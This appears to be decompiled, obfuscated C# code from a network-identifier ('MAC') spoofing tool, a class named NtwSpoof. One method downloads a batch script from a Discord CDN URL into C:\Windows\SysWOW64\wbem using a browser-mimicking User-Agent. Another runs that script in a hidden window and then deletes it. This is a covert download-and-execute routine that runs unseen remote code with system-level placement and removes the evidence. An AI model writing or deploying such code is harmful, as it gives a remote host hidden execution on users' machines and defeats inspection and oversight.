using System.Diagnostics;
using System.IO;
using System.Net;

namespace HardDrive
{
	internal class NtwSpoof
	{
		internal static NtwSpoof JJlLrNZ2GtM24Z5jQjE;

		public static void Mac()
		{
			Process process = new Process();
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\Mac.Oblivion.bat";
			process.Start();
			process.WaitForExit();
			File.Delete("C:\\Windows\\SysWOW64\\wbem\\Mac.Oblivion.bat");
		}

		public static void MacDownload()
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/786910648771674133/811326666059022366/Mac.Oblivion.bat", "C:\\Windows\\SysWOW64\\wbem\\Mac.Oblivion.bat");
			webClient.Proxy = null;
		}

		public NtwSpoof()
		{
			Class15.smethod_0();
			base._002Ector();
		}

		internal static bool aUsWAYZaRxyJhBaoB6s()
		{
			return JJlLrNZ2GtM24Z5jQjE == null;
		}

		internal static void UtYu9cZRi7MxAUbxOnM()
		{
		}
	}
}
